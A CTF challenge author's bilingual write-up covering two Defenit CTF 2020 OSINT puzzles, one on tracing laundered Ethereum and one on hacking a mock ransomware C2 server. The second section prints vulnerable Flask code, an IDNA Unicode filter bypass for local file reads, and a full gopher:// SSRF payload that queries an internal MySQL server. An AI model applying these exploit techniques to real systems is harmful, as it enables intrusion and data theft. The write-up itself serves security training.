---
title: "Defenit CTF 2020 OSINT 출제자 Writeup"
description: "암호화폐와 악성코드 C2 서버를 주제로 한 OSINT 문제 출제자 풀이"
date: 2020-06-06
tags: ["defenit-ctf", "osint", "cryptocurrency", "malware"]
ctf: "Defenit CTF 2020"
published: true
---

**Defenit CTF 2020 OSINT Challenge Write-Up (KOR,ENG)**


![image](/images/writeups/defenit-ctf-2020-osint_331464ce.png)


이번 Defenit CTF 2020에선 OSINT 분야 출제를 맡았습니다. 본래 주 분야가 웹이라 웹과 OSINT를 엮어서 할 수 있는 문제를 만드는것을 목표로 하여 문제를 구상하였습니다. 문제 구상을 하기 전에 OSINT라는 분야에 대해 생각해 보았습니다. '인터넷 상에 공개된 정보를 토대로 해커의 정보를 얻거나 그를 특정하는 것'이 OSINT라는 분야의 주된 목적이라 생각하였고, 이를 최근 트렌드와 엮어 '암호화폐'와 '악성코드' 등을 이용한 해커의 악의적 동작을 막아내는 것을 주 컨셉으로 잡고 문제를 구상·제작 하였습니다. Bad Tumbler는 '암호화폐', Hack the C2는 '악성코드의 C2서버'가 주 컨셉입니다. 그럼 한 문제씩 Write-up을 서술하여 보겠습니다.


In this Defenit CTF 2020, I took charge of the OSINT category. Originally, my main field was the web, so I was going to make the challenge that could be done by combining the web and OSINT. Before I thought about the problem, I thought about the category called OSINT. It was thought that the main purpose of the field of OSINT was to'acquire hacker's information based on information published on the Internet or to specify him', and by linking it with recent trends, hackers using 'cryptocurrency' and 'malware'.  The main concept was to prevent malicious movements and devised and produced problems. 'Bad Tumbler's main concept is 'cryptocurrency', and 'Hack the C2's main concept are 'C2 server of ransomware'. Then let's describe Write-up one by one.


---


**1. Bad Tumblers**


---


**[TL;DR]**


![image](/images/writeups/defenit-ctf-2020-osint_ab9be962.png)


1. parse given address recursively


2. get characteristic of hacker address


3. get connection of all parsed address (tumbler networks + hacker wallet + victim wallet + a)


4. specify the wallet which has characteristic 'from some wallet but to less wallet (unless 5)'


5. specify the wallet which had been having more than 400+ ether


---


이 첼린지는 최근 이슈화 되고있는 암호화폐 돈세탁에 관련된 문제입니다. 해커가 암호화폐를 해킹하여 돈세탁을 맡기고, 출금한 상황에서 이러한 해커를 추적해나가는게 주요 문제 해결의 키 포인트입니다.

우선 전제조건과 설명은 아래와 같습니다

This is a problem related to the money laundering of cryptocurrency, which has recently become an issue. The key point of solving a major problem is that a hacker hacks a cryptocurrency, entrusts money laundering, and tracks the hacker in the withdrawal situation.

First of all, the prerequisites and explanations are as follows:


*[Precondition]*
*0. Hundreds of wallets contain about 5 ether (tumbler)*
*0. Hackers steal more than 400 ethers through hacking per exchange*
*0. Hacker commissions ethereum tumbler to tumbling 400 ether from his wallet*
*0. After tracking the hacking accident that reported by exchange A, we confirmed that it was withdrawn to the hacker wallet of exchange C.*
*0. After checking the amount withdrawn from the wallet of exchange C, it seems that it was not the only exchange(exchange A) that was robbed.*
*0. Therefore, it is a problem to find a hacker wallet of some exchange(in this chall, it will be exchange B). So, we should find clues to track the hacker.*

*[Description]*
*Hacker succeeded in hacking and seizing cryptocurrency, Ethereum! Hacker succeeded in withdraw Ethereum by mixing & tumbling. What we know is the account of the hacker of exchange A which reported the hacking and exchange C which hacker withdrew money. In addition to Exchange A, there is another exchange that has been hacked. Track hackers to find out the bad hacker's wallet address on another exchange!*


![image](/images/writeups/defenit-ctf-2020-osint_22e4b066.png)


길죠?ㅠㅠ 죄송합니다. 보다 좋고 개연성있는 시나리오를 구성하기 위해서 주절주절 써봤습니다..

It's long, isn't it? In order to compose a better and more probable scenario, I've written weekly.


전제조건과 디스크립션의 주요 내용은 첨부된 개념도를 통해 더 직관적으로 이해할 수 있습니다. 각 거래소 A와 B에 피해자들이 있고, 이 피해자들이 이더리움을 해커의 지갑으로 우선 전송, 해커는 모인 이더리움들을 tumbler network에 조금씩 나누어 전송하고, 이렇게 전송된 돈은 tumbler network에서 돌고 돌다가 거래소 C의 해커 계좌로 조금씩 입금됩니다. 한마디로 '컵에 물을 담아 호수에 부은 후, 호수의 물을 다시 다른 컵으로 뜨는 것'과 비슷한 맥락으로 이해하면 됩니다.

The main contents of the precondition and description can be understood more intuitively through the attached conceptual image. There are victims on each of exchanges A and B, and these victims first transfer Ethereum to the hacker's wallet, the hacker transmits the collected Ethereum in small portions to the tumbler network, and the transferred money is circulated on the tumbler network and then exchanges C Will be gradually deposited into your hacker account. In a nutshell, you can understand it in a similar context to'after pouring water into a cup and pouring it into the lake, then floating the water from the lake back into another cup'.


문제에선 거래소 A와 C의 해커 지갑이 주어집니다. 암호화폐의 특성상 각 지갑에서의 거래(Transaction)는 모두 기록되어 모두에게 공유됩니다. 문제를 풀어나가는 첫 단계는 해킹을 당한 거래소 A의 해커 지갑을 분석하여 특징을 조사하고, 이러한 지갑들과 연결된 지갑들을 모두 찾아내 그 지갑들에서 아까 찾아낸 특징을 적용하여 살펴보는 것입니다.

The challenge is given to the exchange A and C hacker wallets. Due to the principle of cryptocurrency, all transactions in each wallet are recorded and shared with all. The first step in solving the problem is to analyze the hacker wallet of the hacked exchange A to investigate its characteristics, find all the wallets associated with these wallets, and apply the features found earlier in those wallets.


![image](/images/writeups/defenit-ctf-2020-osint_1126b75a.png)


문제의 조건으로 주어진 거래소 A의 해커 지갑의 초기 transaction 들입니다.


These are the initial transactions in the hacker wallet of exchange A given as a condition of the problem.


![image](/images/writeups/defenit-ctf-2020-osint_cd2f69c3.png)


Concept Map에서는 상기 그림에 해당하는 거래입니다. 피해자들의 돈이 해커의 지갑으로 입금되는 상황입니다. transaction들을 살펴보면 우선 피해자들의 이더리움이 해커의 지갑으로 모인 후, 이 이더리움들이 tumbler network로 출금되는 것을 알 수 있습니다.


In the Concept Map, it is a transaction corresponding to the picture above. The victim's money is deposited into the hacker's wallet. Looking at the transactions, you can see that the victims' Ethereum is first collected in the hacker's wallet, and then these Ethereums are withdrawn to the tumbler network.


**"Hacker Wallet's Characteristic: many victims deposit to hacker wallet"**


이제 지갑들을 모두 파싱하여 특징을 조사하기 위해 recursive parse를 진행합니다. 수집된 지갑들 중 from/to transaction을 조사하여 지갑(node)간의 연결 정보를 수집합니다. 그 정보 중 우리가 알아낸 특징인 'to transaction이 적은 지갑이 victim 지갑이고, 그 to에 해당하는 지갑이 해커지갑이라는 것'을 적용하여 필터링합니다. 이후 필터링 된 지갑들 중 한때 400이더리움 이상을 가지고 있던 지갑(max current value)을 필터링합니다.


Now parse all wallets and proceed with recursive parse to investigate the features. Among the collected wallets, connection information between wallets is collected by examining from/to transactions. Among the information, we filter by applying the feature that we found out, 'a wallet with a small amount of to transaction is a victim wallet, and a wallet corresponding to that to be a hacker wallet'. Subsequently, the filtered wallet (max current value) that once had more than 400 Ethereum was filtered.


![image](/images/writeups/defenit-ctf-2020-osint_c075c0f1.png)


**solve.py**


[https://github.com/JaewookYou/2020-defenit-ctf-osint-writeup/blob/master/bad-tumblers/solve.py](https://github.com/JaewookYou/2020-defenit-ctf-osint-writeup/blob/master/bad-tumblers/solve.py)


---


**2. hack-the-c2**


---


**[TL;DR]**


1. find nickname at twitter


2. see deleted tweet from web.archive.org


3. find ransomware name at github


4. see private repository(which is code of c2 server) from web.archive.org


5. get url of c2 server and its code


6. bypass curl argument's filter regex by idna normalization


( `ﬁle:/‥/‥/`, ﬁ(\u2025, 1byte) will change to fi(\x46\x49, 2byte) after idna decoding at python )


7. get internal server(which use 7777 port)'s code


8. know it has connection with internal network's mysql server (172.22.0.4:3306)


9. when connect to mysql server, there aren't login password


10. so we can ssrf it by gopher scheme


11. double url encoding because our packet via external server(which use 9090 port)


12. get killcode from mysql, input killcode => FLAG XD


---


*DescriptionSome hacker make ransomware, and he is going to spread it. We should stop him, but the only we have is that the hacker uses nickname 'b4d_ar4n9'. Find hacker's info and stop him!Hints*


- *my own github is not related to solve this challenge*


이 챌린지는 이전 랜섬웨어 킬스위치를 작동시켜 막대한 피해를 막은 영국의 보안 연구원이 떠올라 이와 비슷한 컨셉으로 만든 문제입니다. 보안 연구원인 우리는 인터넷에서 해커의 정보를 수집하여 해당 해커의 C2 서버 코드를 릭하여 자신만이 사용하려 만든 일종의 'admin function'들과 그에서 발생하는 취약점들로 C2서버를 해킹하여 킬스위치를 작동시켜 랜섬웨어 작동을 막아 세상을 구해낸다는(?) 컨셉입니다.


This challenge was created by a British security researcher who ran a previous ransomware kill switch to prevent massive damage and I made this challenge as a similar concept. As a security researcher, we collect hacker's information from the Internet and get the hacker's C2 server code to hack the C2 server by hacking the C2 server with some kind of 'admin functions' and vulnerabilities. The concept is to save the world by activating it to prevent ransomware from working (?).


![image](/images/writeups/defenit-ctf-2020-osint_2dece877.png)


우선 문제를 해결하기 위해선 정보를 수집하여야 합니다. 트위터에 'b4d_ar4n9'을 검색해보면 해당 닉네임을 사용중인 계정과 트윗들이 나옵니다. 이 중, 랜섬웨어의 이름을 썼다 지운 흔적이 위의 이미지와 같이 보입니다.


First, we need to collect information to solve the problem. If you search for 'b4d_ar4n9' on Twitter, the accounts and tweets using the nickname will appear. Of these, the name of the ransomware that was written and erased looks like the image above.


[http://web.archive.org/web/20200520115408/https:/twitter.com/b4d_ar4n9](http://web.archive.org/web/20200520115408/https:/twitter.com/b4d_ar4n9)


![image](/images/writeups/defenit-ctf-2020-osint_174baae6.png)


랜섬웨어 이름이 등장합니다! 추가로 최근 트윗에 'c2 서버의 코드를 모두 커밋했다' 라는 내용이 존재합니다. 따라서 github에서 랜섬웨어의 이름을 토대로 검색해봅시다.


The ransomware name comes up! In addition, a recent tweet says 'committed all code from c2 server'. So let's search based on the name of ransomware on github.


![image](/images/writeups/defenit-ctf-2020-osint_1e5e0e61.png)


해커의 닉네임과(leet lang으로)동일한 계정의 repository가 나옵니다.


You'll get a repository with the same account (with leet lang) as the hacker's nickname.


[https://github.com/Ba6-4raNg/myfirstapp/commit/1c2c1140e17960aa5d81762d3176c10e2f13009c](https://github.com/Ba6-4raNg/myfirstapp/commit/1c2c1140e17960aa5d81762d3176c10e2f13009c)


![image](/images/writeups/defenit-ctf-2020-osint_0b54670c.png)


해당 repository의 커밋을 살펴보면 '모든것을 private로 만들었고, 모든 중요정보는 아카이빙 한다' 라는 기록이 존재합니다.


When looking at the commit of the repository, there is a record that 'everything is made private and all important information is archived'.


[http://web.archive.org/web/20200604115819/https://github.com/Ba6-4raNg](http://web.archive.org/web/20200604115819/https://github.com/Ba6-4raNg)


![image](/images/writeups/defenit-ctf-2020-osint_7f534d11.png)


짜잔- 여기엔 아까 보았던 랜섬웨어 이름으로 된 repository가 존재합니다.


There is a repository in the name of ransomware you saw earlier.


[http://web.archive.org/web/20200604120030/https://github.com/Ba6-4raNg/SUPER_POWERFUL_RANSOMWARE/blob/master/app/main.py](http://web.archive.org/web/20200604120030/https://github.com/Ba6-4raNg/SUPER_POWERFUL_RANSOMWARE/blob/master/app/main.py)


![image](/images/writeups/defenit-ctf-2020-osint_4d4f0d70.png)


해당 repository엔 c2 서버의 주소(http://hack-the-c2.ctf.defenit.kr:9090/)와 그 코드가 있습니다.


The repository contains the address of the c2 server([http://hack-the-c2.ctf.defenit.kr:9090/)](http://hack-the-c2.ctf.defenit.kr:9090/))and its code.


```py
# health check! - ps
@app.route('/he41th_ch3ck_C2_ps')
def health_ps():
	r = subprocess.Popen("ps -ef".split(' '),stdout=subprocess.PIPE).stdout.read().decode().split('\n')
	result = []
	for i in r:
		if 'python' in i:
			result.append(i)
	
	return render_template('he41th_ch3ck_C2_ps.html', results=result)

# health check! - netstat
@app.route('/h3alTh_CHeCK_c2_nEtsTaT')
def health_netstat():
	r = subprocess.Popen("netstat -lntp".split(' '),stdout=subprocess.PIPE).stdout.read().decode().split('\n')
	return render_template('h3alTh_CHeCK_c2_nEtsTaT.html', results=r)
```


[http://hack-the-c2.ctf.defenit.kr:9090/he41th_ch3ck_C2_ps](http://hack-the-c2.ctf.defenit.kr:9090/he41th_ch3ck_C2_ps)


[http://hack-the-c2.ctf.defenit.kr:9090/h3alTh_CHeCK_c2_nEtsTaT](http://hack-the-c2.ctf.defenit.kr:9090/h3alTh_CHeCK_c2_nEtsTaT)


![image](/images/writeups/defenit-ctf-2020-osint_0864d88e.png)


누촐된 코드를 통하여 일반적으로는 쉽게 알 수 없는 route에 접속하면, 현재 c2 서버의 process info와 netstat info를 알 수 있습니다. 이를 통해 내부에 9090 포트 외에 7777 포트로 돌아가는 flask server가 하나 더 있음을 확인 할 수 있습니다. (여기에 37159 포트를 사용하는 127.0.0.11 호스트에 많은 노력을 들인 분들이 있습니다만, 해당 서비스는 docker 안의 네트워크에서 dns를 관리하는 호스트입니다. 문제와는 관련이 없고, 구글링 할 시 찾아볼 수 있는 내용입니다)


If you access a route that is not normally known through the leaked code, you can get the process info and netstat info of the current c2 server. Through this, you can see that there is one more flask server that goes back to port 7777 in addition to port 9090. (Here is a lot of effort on the 127.0.0.11 host that uses port 37159, but the service is a host that manages dns on the network inside the docker. It has nothing to do with the challenge and can be found when you google Content)


```py
# health check! - curl
@app.route('/He4ltH_chEck_c2_cur1')
def health_curl():
	url = request.args.get('url')
	try:
		if url:
			turl = filterUrl(url)
			if turl:
				url = turl
				try:
					buffer = BytesIO()
					c = pycurl.Curl()
					c.setopt(c.URL,url)
					c.setopt(c.SSL_VERIFYPEER, False)
					c.setopt(c.WRITEDATA,buffer)
					c.perform()
					c.close()
					try:
						result = buffer.getvalue().decode().split('\n')
					except:
						result = buffer.getvalue()
				except Exception as e:
					print('[x] curl err - {}'.format(str(e)))
					result = ['err.....']
				return render_template('He4ltH_chEck_c2_cur1.html', results=result)
			else:
				return render_template('He4ltH_chEck_c2_cur1.html', results=['nah.. url is error or unsafe!'])
	except Exception as e:
		print('[x] curl err2... - {}'.format(str(e)))
	return render_template('He4ltH_chEck_c2_cur1.html', results=['nah.. you didn\'t give url'])

def filterUrl(url):
	try:
		# you may not read any file
		if re.compile(r"(^[^:]{3}:)").search(url):
			if re.compile(r"(^[^:]{3}:/[^(.|/)]/[^(.|/)]/)").search(url):
				print('[+] curl url - {}'.format(url.replace("..","").encode('idna').decode().replace("..","")))
				return url.replace("..","").encode('idna').decode().replace("..","")
		elif re.compile(r"(^[^:]{4}://(localhost|172\.22\.0\.\d{1,3})((:\d{1,5})/|/))").search(url):
			p = parse.urlparse(url)
			if (p.scheme == 'http') and p.netloc.split(':')[0] == 'localhost':
				print('[+] curl url - {}'.format(url))
				return url
		elif re.compile(r"(^[^:]{6}://(localhost|172\.22\.0\.\d{1,3})((:\d{1,5})/|/))").search(url):
			print('[+] curl url - {}'.format(url))
			return url
	except Exception as e:
		print('[x] regex err - {}'.format(str(e)))
		return False

	return False
```


가장 중요한 부분인데요, 사용자의 input url을 받아 curl의 인자로 넘겨주는 서비스가 존재합니다. 다만 사용자의 input을 regex로 filtering하고 있어 이를 우회하여 SSRF(Server Side Request Forgery)하는 것이 출제자의 intent입니다. (다행히 unintent로 문제를 해결하신 분이 없습니다)


The most important part, there is a service that takes the user's input url and passes it as an argument of curl. However, since the user's input is filtered with regex, it is the intent of the submitter to bypass this and SSRF (Server Side Request Forgery). (Fortunately, no one has solved the challenge with unintent)


```py
if re.compile(r"(^[^:]{3}:)").search(url):
	if re.compile(r"(^[^:]{3}:/[^(.|/)]/[^(.|/)]/)").search(url):
		print('[+] curl url - {}'.format(url.replace("..","").encode('idna').decode().replace("..","")))
		return url.replace("..","").encode('idna').decode().replace("..","")
```


상기 코드 중 scheme이 3글자 일때의 filtering code를 살펴보면, 특이하게도 input url에서 '..'를 제거 후 'idna normalization'을 수행하는 것을 확인 할 수 있습니다. idna normalization을 할 시 특수 unicode가 printable ascii character로 변환되는 일이 비일비재 합니다. 이번 문제의 의도는 이러한 idna normalization을 유니코드 범위 \u0000에서 \uffff까지 fuzzing하여 해당 문제 해결에 필요한 Gadget을 획득하는 것이었습니다.


Looking at the filtering code when the scheme is 3 letters among the above codes, it can be confirmed that 'idna normalization' is performed after removing '..' from the input url. When performing idna normalization, special unicode is converted into printable ascii character. The intention of this issue was to fuzzing this idna normalization from the Unicode range \u0000 to \uffff to get the Gadget needed to solve that challenge.


![image](/images/writeups/defenit-ctf-2020-osint_46356251.png)


저 또한 idna normalization에서의 특수한 케이스를 얻기 위해 퍼징하여 그 데이터를 가지고 있는데요, 이 중 ﬁ(\ufb01)가 문제 해결에 사용될 수 있습니다. 해당 문자는 idna normalization 이전엔 1바이트이지만 normalization 이후엔 2바이트 ascii character로 변하게 됩니다. 이로 인하여 처음의 3글자 scheme 필터링 regex에 통과되어 idna normalization 이후 file:/// scheme을 사용, local file leak이 가능해지는 것입니다.


I also fuzz to get a special case in idna normalization and have that data, of which ﬁ(\ufb01) can be used to solve the problem. The character is 1 byte before idna normalization, but after normalization it is changed to a 2-byte ascii character. Because of this, the first 3-letter scheme is passed through the filtering regex, and after idna


normalization, a file:/// scheme is used, and a local file leak is possible.


[http://hack-the-c2.ctf.defenit.kr:9090/He4ltH_chEck_c2_cur1?url=ﬁle:/‥/‥/app2/app/main.py](http://hack-the-c2.ctf.defenit.kr:9090/He4ltH_chEck_c2_cur1?url=He4ltH_chEck_c2_cur1?url=)


![image](/images/writeups/defenit-ctf-2020-osint_39cb43a7.png)


이로써 7777 포트로 구동중인 internal flask server에 대한 코드를 획득하였습니다.


So, we can obtain the code for the internal flask server running on port 7777.


```py
def connect_db():
	db = pymysql.connect(
		user='b4d_aR4n9',
		#passwd=os.environ['DBPW'],
		host='172.22.0.4',
 port=3306,
		db='defenit_ctf_2020',
		charset='utf8'
	)

	return db

db = connect_db()


# if input killcode, kill all ransomware
@app.route('/k1ll_r4ns0mw4r3')
def kill_ransom():
	try:
		if request.remote_addr != '172.22.0.3' and request.remote_addr != '127.0.0.1':
			return '[INTERNAL] localhost only..'

		cursor = db.cursor(pymysql.cursors.DictCursor)
		cursor.execute("SELECT ki11c0d3 from secret;")

		if cursor.fetchall()[0]['ki11c0d3'] == request.args.get('ki11c0d3'):
			return subprocess.Popen("/app2/getFlag", stdout=subprocess.PIPE).stdout.read().strip()
		else:
			return '[x] you put wrong killcode!'

	except:
		return '[x] errr.....'
```


해당 코드를 살펴보면 172.22.0.4:3306 으로 mysql connect를 맺어 여기서 killcode를 읽고, killcode가 맞을 시 /app2/getFlag를 실행하여 flag를 출력해주는 것을 확인할 수 있습니다.


```py
elif re.compile(r"(^[^:]{6}://(localhost|172\.22\.0\.\d{1,3})((:\d{1,5})/|/))").search(url):
	print('[+] curl url - {}'.format(url))
	return url
```


external flask에 있던 코드 중 6글자 scheme에 대해선 localhost 혹은 172.22.0.0/24 대역대로만 host를 제한하고 있습니다. 이를 이용하여 gopher://172.22.0.4:3306/으로 raw mysql packet을 보내어 요청한다면 우리가 원하는 임의의 sql query를 입력, 결과를 받아올 수 있습니다. (mysql connection시 비밀번호 없이 인증할 수 있도록 설정되어 있기 때문에handshake시 받아오는 20byte의 hash seed값 없이도 authentication이 가능합니다)


For the 6-letter scheme among the codes in the external flask, the host is limited to the localhost or 172.22.0.0/24 band. If you request by sending raw mysql packet to gopher://172.22.0.4:3306/ using this, you can enter any sql query we want and get the result. (Because it is set to authenticate without a password when connecting to mysql, authentication is possible without a hash seed value of 20 bytes received during handshake)


![image](/images/writeups/defenit-ctf-2020-osint_53056af9.png)


나머지 과정은 Gopherous로 쉽게 해결할 수 있습니다. (이를 못하게 하기 위해 연구중이었지만 시간이 부족하였습니다 ㅠㅠ)


The rest of the process can be easily solved with Gopherous. (I was researching to prevent this, but I ran out of time)


[http://hack-the-c2.ctf.defenit.kr:9090/He4ltH_chEck_c2_cur1?url=gopher://172.22.0.4:3306/_%25a8%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2562%2534%2564%255f%2561%2552%2534%256e%2539%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2526%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2564%2565%2566%2565%256e%2569%2574%255f%2563%2574%2566%255f%2532%2530%2532%2530%252e%2573%2565%2563%2572%2565%2574%2501%2500%2500%2500%2501](http://hack-the-c2.ctf.defenit.kr:9090/He4ltH_chEck_c2_cur1?url=gopher://172.22.0.4:3306/_%25a8%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2562%2534%2564%255f%2561%2552%2534%256e%2539%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2526%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2564%2565%2566%2565%256e%2569%2574%255f%2563%2574%2566%255f%2532%2530%2532%2530%252e%2573%2565%2563%2572%2565%2574%2501%2500%2500%2500%2501)


![image](/images/writeups/defenit-ctf-2020-osint_8dcb9dcc.png)


해당 payload로 gopher scheme을 이용하여 mysql 서버에 요청 시 결과값이 byte로 오는것을 확인할 수 있습니다.


When the request is requested to the mysql server using the gopher scheme as the corresponding payload, the result value can be checked as a byte.


![image](/images/writeups/defenit-ctf-2020-osint_9015e915.png)


이를 출력해보면 killcode를 확인할 수 있습니다.


If you print it out, you can see the killcode.


[http://hack-the-c2.ctf.defenit.kr:9090/He4ltH_chEck_c2_cur1?url=localhost:7777/k1ll_r4ns0mw4r3?ki11c0d3=k1ll_th3_ALL_b4d_aR4n9_ransomeware](http://hack-the-c2.ctf.defenit.kr:9090/He4ltH_chEck_c2_cur1?url=http://localhost:7777/k1ll_r4ns0mw4r3?ki11c0d3=k1ll_th3_ALL_b4d_aR4n9_ransomeware)


![image](/images/writeups/defenit-ctf-2020-osint_39298589.png)


GET FLAG!!!


---


Epilogue.


이렇게 제대로 마음잡고 CTF에 문제를 내본 것은 처음인것 같습니다. 주 분야가 아닌 분야의 출제를 맡아 처음엔 걱정도 고민도 많이 됐지만 다 만들고 나니 OSINT라는 카테고리에 어울리는 문제를 만든것 같다는 소소한 만족감(?)을 얻었는데, 푸신분들은 어떠셨을 지 잘 모르겠습니다. 괜찮았나요? 처음에 생각했던 것 보다 만드는데 어려움이 있어 현재보다 더욱 재밌는 챌린지를 만들지 못해 아쉽지만 기회가 된다면 그 생각들을 나중에 다시 문제로 실현시켜 공유해보고 싶네요. 풀어주신 분들께 정말 감사드리고 혹 부족함이 있었다면 죄송합니다. 감사합니다. 그럼이만!


It seems to be the first time I have properly thought about this and presented a problem to the CTF. I had a lot of worries and worries at first because I took the questions in a field other than the main one, but after I finished making it, I got a slight satisfaction (?) that it seemed to have created a problem that fits into the category called OSINT. Was it okay? It's a pity that I couldn't create a more challenging challenge than it is now because I have a harder time to make it than I thought at first, but if I have the chance, I would like to share it later as a problem. Thank you so much for releasing and sorry if there was any shortage. Thank you. Sure!


'bad-tumblers' 문제를 제작하는데 사용한 스크립트/솔버 파일과 'hack-the-c2' 문제의 도커 및 소스를 업로드 하였으니 직접 구성하여 해보고싶으신 분들은 참고 부탁드립니다!


I uploaded the script/solver file used to create the'bad-tumblers' challenge, and the docker & source code of the 'hack-the-c2' challenge, so if you want to configure it yourself, please take a look!


[https://github.com/JaewookYou/2020-defenit-ctf-osint-writeup](https://github.com/JaewookYou/2020-defenit-ctf-osint-writeup)


made by @arang